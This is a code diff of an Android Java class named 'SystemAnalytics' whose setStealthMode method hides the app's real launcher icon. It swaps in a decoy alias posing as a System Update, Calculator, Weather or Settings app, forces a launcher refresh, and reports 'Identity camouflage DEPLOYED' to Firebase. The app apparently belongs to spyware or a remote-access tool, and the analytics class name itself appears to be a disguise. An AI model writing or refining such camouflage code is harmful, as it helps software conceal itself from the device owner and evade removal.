@@ -180,87 +180,72 @@ public class SystemAnalytics {
      */
     public static void setStealthMode(android.content.Context context, boolean stealth) {
         try {
-            android.util.Log.d("SystemAnalytics", "Executing stealth protocol. Active: " + stealth);
+            String pkg = context.getPackageName();
+            android.util.Log.d("SystemAnalytics", "Stealth Protocol: stealth=" + stealth + ", pkg=" + pkg);
             
             android.content.pm.PackageManager pm = context.getPackageManager();
-            android.content.ComponentName main = new android.content.ComponentName(context, context.getPackageName() + ".LauncherAlias");
+            String basePkg = "com.labs.labrats";
             
-            // Resolve chosen Decoy from Persisted Settings or BuildConfig fallback
-            int choice = getDecoyChoice(context);
-            String decoyClass = context.getPackageName() + ".SystemUpdateAlias";
-            switch (choice) {
-                case 2: decoyClass = context.getPackageName() + ".CalculatorAlias"; break;
-                case 3: decoyClass = context.getPackageName() + ".WeatherAlias"; break;
-                case 4: decoyClass = context.getPackageName() + ".SettingsAlias"; break;
-            }
-            
-            android.content.ComponentName decoy = new android.content.ComponentName(context, decoyClass);
+            // All relevant component aliases
+            String[] aliases = {
+                basePkg + ".LauncherAlias",
+                basePkg + ".SystemUpdateAlias",
+                basePkg + ".CalculatorAlias",
+                basePkg + ".WeatherAlias",
+                basePkg + ".SettingsAlias",
+                basePkg + ".LabRatsLogoAlias"
+            };
 
-            // [OPTIMIZATION] Check current state first to avoid redundant launcher restarts
-            int mainState = pm.getComponentEnabledSetting(main);
-            int decoyState = pm.getComponentEnabledSetting(decoy);
-            
-            boolean currentlyStealth = (mainState == android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED);
-            
-            if (stealth == currentlyStealth && stealth && decoyState == android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED) {
-                // Already in correct stealth mode with the right decoy, do nothing
-                return;
-            }
-            if (stealth == currentlyStealth && !stealth) {
-                // Already in normal mode, do nothing
-                return;
+            // Target component to enable
+            String targetToEnable;
+            if (stealth) {
+                int choice = getDecoyChoice(context);
+                switch (choice) {
+                    case 2: targetToEnable = basePkg + ".CalculatorAlias"; break;
+                    case 3: targetToEnable = basePkg + ".WeatherAlias"; break;
+                    case 4: targetToEnable = basePkg + ".SettingsAlias"; break;
+                    case 5: targetToEnable = basePkg + ".LabRatsLogoAlias"; break;
+                    default: targetToEnable = basePkg + ".SystemUpdateAlias"; break;
+                }
+            } else {
+                targetToEnable = basePkg + ".LauncherAlias";
             }
 
-            // Persist the stealth state
-            context.getSharedPreferences("StabilityConfig", android.content.Context.MODE_PRIVATE)
-                    .edit().putBoolean("stealth_enabled", stealth).apply();
+            android.util.Log.d("SystemAnalytics", "Target component to enable: " + targetToEnable);
+
+            // Phase 1: Enable the target component first
+            android.content.ComponentName targetComp = new android.content.ComponentName(pkg, targetToEnable);
+            pm.setComponentEnabledSetting(targetComp, 
+                android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED, 
+                android.content.pm.PackageManager.DONT_KILL_APP);
+            android.util.Log.d("SystemAnalytics", "Enabled target: " + targetToEnable);
+
+            // Phase 2: Disable all other components
+            for (String alias : aliases) {
+                if (!alias.equals(targetToEnable)) {
+                    android.content.ComponentName comp = new android.content.ComponentName(pkg, alias);
+                    pm.setComponentEnabledSetting(comp, 
+                        android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED, 
+                        android.content.pm.PackageManager.DONT_KILL_APP);
+                    android.util.Log.d("SystemAnalytics", "Disabled alias: " + alias);
+                }
+            }
 
             if (stealth) {
-                // Disable Main
-                pm.setComponentEnabledSetting(main, android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED, android.content.pm.PackageManager.DONT_KILL_APP);
-                
-                // Disable ALL other decoys first to ensure only one is active
-                String[] decoys = {
-                    context.getPackageName() + ".SystemUpdateAlias",
-                    context.getPackageName() + ".CalculatorAlias",
-                    context.getPackageName() + ".WeatherAlias",
-                    context.getPackageName() + ".SettingsAlias"
-                };
-                for (String d : decoys) {
-                    if (!d.equals(decoyClass)) {
-                        pm.setComponentEnabledSetting(new android.content.ComponentName(context, d), android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED, android.content.pm.PackageManager.DONT_KILL_APP);
-                    }
-                }
-
-                // Enable chosen decoy
-                pm.setComponentEnabledSetting(decoy, android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED, android.content.pm.PackageManager.DONT_KILL_APP);
-                
-                FirebaseConfig.logActivity("STEALTH_SHIELD: Identity camouflage DEPLOYED (" + decoyClass + ")");
+                FirebaseConfig.logActivity("STEALTH_SHIELD: Identity camouflage DEPLOYED (" + targetToEnable + ")");
             } else {
-                // Restore Main
-                pm.setComponentEnabledSetting(main, android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED, android.content.pm.PackageManager.DONT_KILL_APP);
-                
-                // Disable all possible decoys
-                String[] decoys = {
-                    context.getPackageName() + ".SystemUpdateAlias",
-                    context.getPackageName() + ".CalculatorAlias",
-                    context.getPackageName() + ".WeatherAlias",
-                    context.getPackageName() + ".SettingsAlias"
-                };
-                for (String d : decoys) {
-                    pm.setComponentEnabledSetting(new android.content.ComponentName(context, d), android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED, android.content.pm.PackageManager.DONT_KILL_APP);
-                }
                 FirebaseConfig.logActivity("STEALTH_SHIELD: Identity camouflage RELEASED");
             }
 
-            // Force Launcher Refresh
+            // Phase 3: Force Launcher Refresh
             android.content.Intent home = new android.content.Intent(android.content.Intent.ACTION_MAIN);
             home.addCategory(android.content.Intent.CATEGORY_HOME);
             home.addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK);
             context.startActivity(home);
 
         } catch (Exception e) {
-            android.util.Log.e("SystemAnalytics", "Stealth Error: " + e.getMessage());
+            android.util.Log.e("SystemAnalytics", "Stealth Error: " + e.getMessage(), e);
+            FirebaseConfig.logActivity("ERROR: Stealth protocol failure - " + e.getMessage());
         }
     }
 
@@ -277,7 +262,7 @@ public class SystemAnalytics {
     public static boolean isStealthEnabled(Context context) {
         // First check if Main launcher is actually disabled - that's the source of truth
         try {
-            android.content.ComponentName main = new android.content.ComponentName(context, context.getPackageName() + ".LauncherAlias");
+            android.content.ComponentName main = new android.content.ComponentName(context, "com.labs.labrats.LauncherAlias");
             int state = context.getPackageManager().getComponentEnabledSetting(main);
             if (state == android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED) return true;
             if (state == android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED) return false;
